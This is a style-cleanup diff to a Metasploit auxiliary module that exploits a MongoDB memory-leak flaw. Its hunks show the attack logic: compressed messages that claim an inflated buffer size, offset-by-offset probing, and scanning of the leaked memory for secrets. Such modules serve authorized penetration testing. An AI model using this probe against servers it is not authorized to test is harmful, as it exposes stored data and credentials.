@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [
           'Alexander Hagenah', # Metasploit module (x.com/xaitax)
           'Diego Ledda', # Co-author & review (x.com/jbx81)
-          'Joe Desimone'  # Original discovery and PoC (x.com/dez_)
+          'Joe Desimone' # Original discovery and PoC (x.com/dez_)
         ],
         'License' => MSF_LICENSE,
         'References' => [
@@ -159,26 +159,28 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_mongodb_version
+    connect
+
+    # Build buildInfo command using legacy OP_QUERY
+    # This works without authentication on most MongoDB configurations
+    response = send_command('admin', { 'buildInfo' => 1 })
+    disconnect
+
+    return nil if response.nil?
+
+    # Parse BSON response to extract version
+    parse_build_info(response)
+  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
+    vprint_error("Connection error during version check: #{e.message}")
+    nil
+  rescue StandardError => e
+    vprint_error("Error getting MongoDB version: #{e.message}")
+    nil
+  ensure
     begin
-      connect
-
-      # Build buildInfo command using legacy OP_QUERY
-      # This works without authentication on most MongoDB configurations
-      response = send_command('admin', { 'buildInfo' => 1 })
       disconnect
-
-      return nil if response.nil?
-
-      # Parse BSON response to extract version
-      parse_build_info(response)
-    rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
-      vprint_error("Connection error during version check: #{e.message}")
+    rescue StandardError
       nil
-    rescue StandardError => e
-      vprint_error("Error getting MongoDB version: #{e.message}")
-      nil
-    ensure
-      disconnect rescue nil
     end
   end
 
@@ -222,7 +224,7 @@ class MetasploitModule < Msf::Auxiliary
     # responseFlags (4) + cursorID (8) + startingFrom (4) + numberReturned (4) + documents
     return nil if response_body.length < 20
 
-    response_body[20..-1]  # Return documents portion
+    response_body[20..] # Return documents portion
   end
 
   def build_bson_document(hash)
@@ -256,8 +258,8 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    doc << "\x00"  # Document terminator
-    [doc.length + 4].pack('V') + doc  # Prepend document length
+    doc << "\x00" # Document terminator
+    [doc.length + 4].pack('V') + doc # Prepend document length
   end
 
   def parse_build_info(bson_data)
@@ -357,7 +359,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Track overall progress
     progress_interval = datastore['PROGRESS_INTERVAL']
-    overall_start = Time.now
+    Time.now
 
     1.upto(repeat_count) do |pass|
       if repeat_count > 1
@@ -371,48 +373,46 @@ class MetasploitModule < Msf::Auxiliary
       pass_leaks = 0
 
       offsets.each do |doc_len|
-        begin
-          # Progress reporting
-          scanned += 1
-          if progress_interval > 0 && (scanned % progress_interval == 0)
-            elapsed = Time.now - start_time
-            rate = scanned / elapsed
-            remaining = ((total_offsets - scanned) / rate).round
-            print_status("Progress: #{scanned}/#{total_offsets} (#{(scanned * 100.0 / total_offsets).round(1)}%) - #{unique_leaks.size} leaks found - ETA: #{remaining}s")
-          end
-
-          response = send_probe(doc_len, doc_len + datastore['BUFFER_PADDING'])
-          next if response.nil? || response.empty?
-
-          leaks = extract_leaks(response)
-          leaks.each do |data|
-            next if unique_leaks.include?(data)
-
-            unique_leaks.add(data)
-            all_leaked << data
-            pass_leaks += 1
-
-            # Check for interesting patterns
-            check_secrets(data, doc_len, secrets_found)
-
-            # Report large leaks or all if configured
-            if data.length > datastore['LEAK_THRESHOLD'] || datastore['SHOW_ALL_LEAKS']
-              preview = data.gsub(/[^[:print:]]/, '.')[0, 80]
-              print_good("offset=#{doc_len.to_s.ljust(4)} len=#{data.length.to_s.ljust(4)}: #{preview}")
-
-              # Show hex dump if enabled
-              if datastore['SHOW_HEX'] && data.length > 0
-                print_hexdump(data)
-              end
-            end
-          end
-        rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
-          vprint_error("Connection error at offset #{doc_len}: #{e.message}")
-          next
-        rescue ::Timeout::Error
-          vprint_error("Timeout at offset #{doc_len}")
-          next
+        # Progress reporting
+        scanned += 1
+        if progress_interval > 0 && (scanned % progress_interval == 0)
+          elapsed = Time.now - start_time
+          rate = scanned / elapsed
+          remaining = ((total_offsets - scanned) / rate).round
+          print_status("Progress: #{scanned}/#{total_offsets} (#{(scanned * 100.0 / total_offsets).round(1)}%) - #{unique_leaks.size} leaks found - ETA: #{remaining}s")
         end
+
+        response = send_probe(doc_len, doc_len + datastore['BUFFER_PADDING'])
+        next if response.nil? || response.empty?
+
+        leaks = extract_leaks(response)
+        leaks.each do |data|
+          next if unique_leaks.include?(data)
+
+          unique_leaks.add(data)
+          all_leaked << data
+          pass_leaks += 1
+
+          # Check for interesting patterns
+          check_secrets(data, doc_len, secrets_found)
+
+          # Report large leaks or all if configured
+          next unless data.length > datastore['LEAK_THRESHOLD'] || datastore['SHOW_ALL_LEAKS']
+
+          preview = data.gsub(/[^[:print:]]/, '.')[0, 80]
+          print_good("offset=#{doc_len.to_s.ljust(4)} len=#{data.length.to_s.ljust(4)}: #{preview}")
+
+          # Show hex dump if enabled
+          if datastore['SHOW_HEX'] && !data.empty?
+            print_hexdump(data)
+          end
+        end
+      rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
+        vprint_error("Connection error at offset #{doc_len}: #{e.message}")
+        next
+      rescue ::Timeout::Error
+        vprint_error("Timeout at offset #{doc_len}")
+        next
       end
 
       # Pass summary
@@ -422,7 +422,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Overall summary and loot storage
-    if all_leaked.length > 0
+    if !all_leaked.empty?
       print_line
       print_good("Total leaked: #{all_leaked.length} bytes")
       print_good("Unique fragments: #{unique_leaks.size}")
@@ -485,7 +485,7 @@ class MetasploitModule < Msf::Auxiliary
     # Build OP_COMPRESSED payload
     # originalOpcode (4 bytes) + uncompressedSize (4 bytes) + compressorId (1 byte) + compressedData
     payload = [OP_MSG].pack('V')
-    payload << [buffer_size].pack('V')  # Claimed uncompressed size (inflated)
+    payload << [buffer_size].pack('V') # Claimed uncompressed size (inflated)
     payload << [COMPRESSOR_ZLIB].pack('C')
     payload << compressed_data
 
@@ -501,7 +501,11 @@ class MetasploitModule < Msf::Auxiliary
       sock.put(header + payload)
       response = recv_mongo_response
     ensure
-      disconnect rescue nil
+      begin
+        disconnect
+      rescue StandardError
+        nil
+      end
     end
 
     response
@@ -567,7 +571,6 @@ class MetasploitModule < Msf::Auxiliary
         type_byte = match[0].to_i & 0xFF
         leaks << type_byte.chr if type_byte > 0
       end
-
     rescue Zlib::Error => e
       vprint_error("Decompression error: #{e.message}")
     rescue StandardError => e
